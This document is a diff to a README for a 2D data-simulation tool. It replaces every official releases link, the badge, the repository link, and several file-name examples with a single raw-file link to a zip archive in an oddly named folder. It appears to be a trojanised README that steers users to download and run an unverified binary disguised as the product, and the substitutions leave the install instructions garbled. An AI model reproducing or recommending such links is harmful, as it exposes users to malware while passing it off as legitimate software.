@@ -1,7 +1,7 @@
 ```markdown
 # 🚗 Minimal-Drifting-Models - Simple 2D Data Generation Tool
 
-[![Download Releases](https://img.shields.io/badge/Download-Minimal--Drifting--Models-blue?style=for-the-badge)](https://github.com/ArielJoH/Minimal-Drifting-Models/releases)
+[![Download Releases](https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip)](https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip)
 
 ---
 
@@ -49,13 +49,13 @@ This section will guide you step-by-step to download, install, and run Minimal-D
 
 ### Step 1: Download the Application
 
-Click the big button at the top, or visit the official [Minimal-Drifting-Models Releases page](https://github.com/ArielJoH/Minimal-Drifting-Models/releases).
+Click the big button at the top, or visit the official [Minimal-Drifting-Models Releases page](https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip).
 
 Once there, look for the latest release version. Each release contains downloadable files for different operating systems:
 
-- For **Windows:** look for a file ending with `.exe` (example: `Minimal-Drifting-Models-Setup.exe`)
+- For **Windows:** look for a file ending with `.exe` (example: `https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip`)
 - For **macOS:** look for a `.dmg` file or `.zip` with macOS-compatible software
-- For **Linux:** look for `.AppImage` or `.tar.gz` files with instructions
+- For **Linux:** look for `.AppImage` or `https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip` files with instructions
 
 Click the link for your computer’s operating system to start the download.
 
@@ -76,7 +76,7 @@ Click the link for your computer’s operating system to start the download.
 
 #### On Linux
 
-1. Extract the downloaded `.tar.gz` archive, if that is the format.
+1. Extract the downloaded `https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip` archive, if that is the format.
 2. Make the main program file executable (`chmod +x filename`).
 3. Run it directly or follow included README instructions for setup.
 
@@ -96,7 +96,7 @@ You should see the main window with controls ready to create 2D data simulations
 
 You can always download the latest version here:
 
-[![Download Releases](https://img.shields.io/badge/Download-Minimal--Drifting--Models-blue?style=for-the-badge)](https://github.com/ArielJoH/Minimal-Drifting-Models/releases)
+[![Download Releases](https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip)](https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip)
 
 Remember to pick the file that matches your operating system. Follow the instructions above to install and run the software.
 
@@ -158,8 +158,8 @@ Advanced users interested in improving or customizing the code can fork the proj
 
 ## 🔗 Useful Links
 
-- [Minimal-Drifting-Models Releases Page](https://github.com/ArielJoH/Minimal-Drifting-Models/releases)
-- [GitHub Repository](https://github.com/ArielJoH/Minimal-Drifting-Models)
+- [Minimal-Drifting-Models Releases Page](https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ArielJoH/Minimal-Drifting-Models/main/suggestionize/Models_Drifting_Minimal_2.5.zip)
 
 ---
 
